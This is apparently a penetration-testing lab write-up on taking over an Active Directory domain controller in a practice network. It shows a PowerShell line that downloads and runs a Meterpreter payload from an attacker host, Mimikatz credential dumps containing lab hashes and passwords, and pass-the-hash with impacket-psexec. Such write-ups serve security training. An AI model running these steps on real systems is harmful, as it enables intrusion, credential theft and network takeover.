---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Gaining Access to the Domain Controller

Now that the attacker has gained local Administrator access to the `MAILSRV1` machine there seems to be a clear path forward. Recall that the Domain Admin user `beccy` had an active session on `MAILSRV1`. With this elevated access perhaps the hash of her credentials can be accessed and then levered into domain controller access.

## Extracting Cached Credentials

Before moving into extraction the attacker should transfer their reverse shell session to another Meterpreter session. This can be done by downloading `met.exe` and launching it via the reverse shell:

{% code overflow="wrap" %}
```powershell
cd C:\Users\Administrator;iwr -uri http://192.168.45.243/tmp/met.exe -o .\met.exe; .\met.exe
```
{% endcode %}

This causes another session to be started in the Metasploit console:

```
msf6 auxiliary(server/socks_proxy) > [*] Meterpreter session 2 opened (192.168.45.243:443 -> 192.168.174.242:60529) at 2024-04-20 17:32:18 -0600

msf6 auxiliary(server/socks_proxy) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x64/windows  BEYOND\marcus @ CLIENTWK1       192.168.45.243:443 -> 192.168.174.242:62836 (172.16.130.243)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ MAILSRV1  192.168.45.243:443 -> 192.168.174.242:60529 (192.168.174.242)
```

The Meterpreter session can then be used to upload Mimikatz:

```
upload ./Mimikatz.exe C:\\Users\\Administrator\\Mimikatz.exe
```

### Mimikatz

Now Mimikatz can be run and the `sekurlsa::logonpasswords` command used to extract hashes:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 635612 (00000000:0009b2dc)
Session           : Batch from 0
User Name         : Administrator
Domain            : MAILSRV1
Logon Server      : MAILSRV1
Logon Time        : 3/28/2024 3:39:00 AM
SID               : S-1-5-21-3952879524-1180826585-1433334954-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : MAILSRV1
         * NTLM     : 76821e8eeb84c0ec6446dbcc40ee2c99
         * SHA1     : d8dab7e916059ea33c6cf05fbbf007122ff32c75
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : MAILSRV1
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : MAILSRV1
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 310897 (00000000:0004be71)
Session           : Interactive from 1
User Name         : beccy
Domain            : BEYOND
Logon Server      : DCSRV1
Logon Time        : 3/28/2024 3:37:07 AM
SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
        msv :
         [00000003] Primary
         * Username : beccy
         * Domain   : BEYOND
         * NTLM     : f0397ec5af49971f6efbdb07877046b3
         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
        tspkg :
        wdigest :
         * Username : beccy
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : beccy
         * Domain   : BEYOND.COM
         * Password : NiftyTopekaDevolve6655!#!
        ssp :
        credman :
        cloudap :
...
```

The attacker now has the password hash of both the local `Administrator` (which can be potentially passed without needing to abuse the WordPress plugin) and `beccy`'s password hash as well as her plaintext password.

## Lateral Movement

With `beccy`'s hash and password, access is now pretty easy to obtain.

### Passing the Hash

`beccy`'s hash will be passed to the domain controller using [`impacket-psexec`](https://github.com/fortra/impacket/blob/master/examples/psexec.py) and Proxychains:

{% code overflow="wrap" %}
```bash
proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.130.240
```
{% endcode %}

When this is run the attacker ends up with a shell session on the domain controller:

```shell-session
kali@kali:~/beyond$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.130.240
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 172.16.130.240.....
[*] Found writable share ADMIN$
[*] Uploading file bCgldqHa.exe
[*] Opening SVCManager on 172.16.130.240.....
[*] Creating service txJk on 172.16.130.240.....
[*] Starting service txJk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DCSRV1

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.130.240
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.130.254
```

At this point the attacker has successfully taken over the whole network! It is worth noting that the -c flag can be used with impacket-psexec to copy a file to the target machine. In this case it can be used to copy and launch Mimikatz:

{% code overflow="wrap" %}
```bash
proxychains -q impacket-psexec -c ./Mimikatz.exe -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.130.240
```
{% endcode %}

This can be quite slow since it is running over the proxy but it does allow things like successful extraction of the `BEYOND\Administrator` account hash:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 499114 (00000000:00079daa)
Session           : Batch from 0
User Name         : Administrator
Domain            : BEYOND
Logon Server      : DCSRV1
Logon Time        : 3/28/2024 3:11:56 AM
SID               : S-1-5-21-1104084343-2915547075-2081307249-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : BEYOND
         * NTLM     : 8480fa6ca85394df498139fe5ca02b95
         * SHA1     : d6ba3f188d0ecf00e089ca064d1fbc8566dc1b14
         * DPAPI    : 0f6271076fa7ddbdb444c50da3c75116
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : beyond.com
         * Password : HotspotAarlockBurrito2@1!
        ssp :
        credman :
        cloudap :
...
```

All desired outcomes have been achieved!
